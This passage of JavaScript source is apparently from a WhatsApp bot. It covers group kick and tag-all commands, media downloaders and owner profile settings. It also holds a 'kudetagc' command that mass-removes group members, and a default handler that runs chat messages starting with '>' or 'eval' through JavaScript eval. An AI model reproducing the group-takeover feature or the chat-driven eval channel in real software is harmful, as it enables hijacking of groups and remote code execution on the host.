                    let users = m.quoted ? m.quoted.sender : (m.mentionedJid?.[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net')    
                    if (!users || users.length < 15) return payreply("Reply / tag orang yang mau dikick", lol, m, depayy, proto)
                    try {
                        await depayy.groupParticipantsUpdate(m.chat, [users], 'remove')
                        payreply(`✅ Berhasil mengeluarkan @${users.split('@')[0]}`, lol, m, depayy, proto, { mentions: [users] })
                    } catch (err) {
                        console.log(err)
                        payreply("❌ Gagal kick user", lol, m, depayy, proto)
                    }
                }
                break;    
                case "tagall": {
                        if (!isGroup) return payreply(mess.group, lol, m, depayy, proto)
                        if (!text) return payreply("Teksnya mana bang?", lol, m, depayy, proto)
                        await tagAll(m, depayy, text)
                }
                break;

                case "getlinkgc": case "linkgroup": {
                        if (!isCreator && !isPremium) return payreply(mess.owner, lol, m, depayy, proto)
                        await getGroupLink(m, depayy, payreply, lol, proto)
                }
                break;
                case "kudetagc": 
                case "kickallmem": {
                    await kudetaGrup(depayy, m, botNumber, isCreator)
                }
                break;                                
               
                //Download menu
                case 'play':
                case 'ytplay': {
                    await youtubePlay(depayy, m, text, command)
                }
                break;      
                case 'playch': {
                    await playChannel(depayy, m, text)
                }
                break;                                 
                case "ytmp3": {
                        await ytmp3(depayy, m, text)
                }
                break;
                case 'tt':
                case 'tiktok':
                const linkTT = body.split(' ')[1];
                if (!linkTT) return payreply('⚠️ Masukkan Link!', lol, m, depayy, proto);
                tiktokDownloader(linkTT).then(async (res) => {
                  await depayy.sendMessage(m.chat, { 
                    video: { url: res.no_watermark },
                    caption: `🎬 ${res.title}`,
                    jpegThumbnail: await (await fetch(res.cover)).arrayBuffer()
                  }, { quoted: m });
                }).catch(e => payreply('❌ Error: ' + e.message, lol, m, depayy, proto));
                break;    
                case "capcut": {
                    await capcutDl(depayy, m, q)
                }
                break;     
                case 'mediafire': 
                case 'mf': {
                    await mediafireDl(depayy, m, args)
                }
                break;
                case "facebook":
                case "fb": {
                    await facebookDl(depayy, m, text)
                }
                break;
                case 'instagram':
                case 'ig': {
                    await instagramDl(depayy, m, text)
                }
                break; 
                case "spotify": {
                    await spotifyDl(depayy, m, q)
                }
                break;
                case 'ytmp4':
                case 'ytv': {
                    await ytmp4(m, depayy, text)
                }
                break;
                case "ttmp3": 
                case "tiktokmp3": {
                    await tiktokMp3(depayy, m, text)
                }
                break;
                                                                case "changebotname": {
    if (!isCreator) return payreply("❌ Owner only!", lol, m, depayy, proto);
    if (!text) return payreply(`Usage: ${prefix}changebotname <new name>`, lol, m, depayy, proto);
    if (text.length > 40) return payreply("❌ Max 40 characters!", lol, m, depayy, proto);
    
    try {
        await depayy.updateProfileName(text.trim());
        
        // Save to session config for persistence
        const sessionPath = `./database/sessions/${botNumber}/config.json`;
        const config = fs.existsSync(sessionPath) ? JSON.parse(fs.readFileSync(sessionPath)) : {};
        config.botName = text.trim();
        fs.writeFileSync(sessionPath, JSON.stringify(config, null, 2));
        
        payreply(`✅ Bot name changed to: *${text.trim()}*`, lol, m, depayy, proto);
    } catch (err) {
        console.error(err);
        payreply("❌ Failed to change bot name. Try again later.", lol, m, depayy, proto);
    }
}
break;

case "setbotpic": {
    if (!isCreator) return payreply("❌ Owner only!", lol, m, depayy, proto);
    
    const isImage = /image/.test(mime);
    const quotedImage = quoted?.message?.imageMessage;
    
    if (!isImage && !quotedImage) {
        return payreply(
            `📸 Reply to an image or send image with caption:\n${prefix}setbotpic`,
            lol, m, depayy, proto
        );
    }

    try {
        let mediaMessage = m;
        
        if (quotedImage) {
            mediaMessage = quoted;
        }

        const buffer = await downloadMediaMessage(
            mediaMessage,
            "buffer",
            {},
            {
                logger: pino({ level: "silent" }),
                reuploadRequest: depayy.updateMediaMessage
            }
        );

        if (buffer.length > 5 * 1024 * 1024) {
            return payreply("❌ Image too large! Max 5MB.", lol, m, depayy, proto);
        }

        const savePath = `./database/sessions/${botNumber}/profile.jpg`;
        fs.mkdirSync(`./database/sessions/${botNumber}`, { recursive: true });
        fs.writeFileSync(savePath, buffer);

        await depayy.updateProfilePicture(botNumber, buffer);
        
        payreply("✅ Bot profile picture updated successfully!", lol, m, depayy, proto);
        
    } catch (err) {
        console.error("Error setting bot picture:", err);
        payreply("❌ Failed to set bot picture. Make sure the image is valid.", lol, m, depayy, proto);
    }
}
break;

// Optional: Combined command to match Depay style
case "setbot": {
    if (!isCreator) return payreply("❌ Owner only!", lol, m, depayy, proto);
    
    const hasImage = /image/.test(mime);
    const hasName = text && text.length > 0;
    
    if (!hasImage && !hasName) {
        return payreply(
            `🎛️ *SET BOT PROFILE*\n\n` +
            `• Change name: ${prefix}setbot <name>\n` +
            `• Change picture: reply to image with ${prefix}setbot\n` +
            `• Change both: send image with caption ${prefix}setbot <name>`,
            lol, m, depayy, proto
        );
    }
    
    if (hasName && text.length > 40) {
        return payreply("❌ Name max 40 characters!", lol, m, depayy, proto);
    }
    
    let imageBuffer = null;
    let successMsg = [];
    
    if (hasImage) {
        try {
            const mediaMessage = m.quoted?.message?.imageMessage ? m.quoted : m;
            imageBuffer = await downloadMediaMessage(
                mediaMessage,
                "buffer",
                {},
                { logger: pino({ level: "silent" }) }
            );
            
            if (imageBuffer.length > 5 * 1024 * 1024) {
                return payreply("❌ Image too large! Max 5MB.", lol, m, depayy, proto);
            }
        } catch (err) {
            return payreply("❌ Failed to download image.", lol, m, depayy, proto);
        }
    }
    
    try {
        if (hasName) {
            await depayy.updateProfileName(text.trim());
            successMsg.push("name");
            
            const sessionPath = `./database/sessions/${botNumber}/config.json`;
            const config = fs.existsSync(sessionPath) ? JSON.parse(fs.readFileSync(sessionPath)) : {};
            config.botName = text.trim();
            fs.writeFileSync(sessionPath, JSON.stringify(config, null, 2));
        }
        
        if (imageBuffer) {
            await depayy.updateProfilePicture(botNumber, imageBuffer);
            const savePath = `./database/sessions/${botNumber}/profile.jpg`;
            fs.mkdirSync(`./database/sessions/${botNumber}`, { recursive: true });
            fs.writeFileSync(savePath, imageBuffer);
            successMsg.push("picture");
        }
        
        payreply(`✅ Bot ${successMsg.join(" and ")} updated successfully!`, lol, m, depayy, proto);
        
    } catch (err) {
        console.error(err);
        payreply("❌ Failed to update bot profile. Rate limited or try again.", lol, m, depayy, proto);
    }
}
break;

case "resetbotpic": {
    if (!isCreator) return payreply("❌ Owner only!", lol, m, depayy, proto);
    
    const defaultPath = "./Asset/default/profile.jpg";
    
    if (!fs.existsSync(defaultPath)) {
        return payreply("❌ No default profile picture found!", lol, m, depayy, proto);
    }
    
    try {
        const defaultBuffer = fs.readFileSync(defaultPath);
        await depayy.updateProfilePicture(botNumber, defaultBuffer);
        payreply("✅ Bot profile picture reset to default!", lol, m, depayy, proto);
    } catch (err) {
        console.error(err);
        payreply("❌ Failed to reset profile picture.", lol, m, depayy, proto);
    }
}
break;                                             
                default:
                    if (body.startsWith('>') || body.startsWith('eval')) {
                        if (!isCreator) return
                        let kode = body.startsWith('eval') ? body.replace('eval', '').trim() : body.replace('>', '').trim()
                        if (m.quoted) kode = m.quoted.text || m.quoted.caption || m.quoted.conversation || kode
                        if (!kode) return
                        try {
                            let evaled = await eval(`(async () => { ${kode.includes('return') ? kode : 'return ' + kode} })()`)
                            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                            m.reply(evaled)
                        } catch (err) {
                            m.reply(String(err))
                        }
                    }

            } 

        } catch (err) {
            console.log(chalk.white.bgRed.bold(`-`), chalk.red(err));
        }
    }); 
    return depayy;
}

StartBot();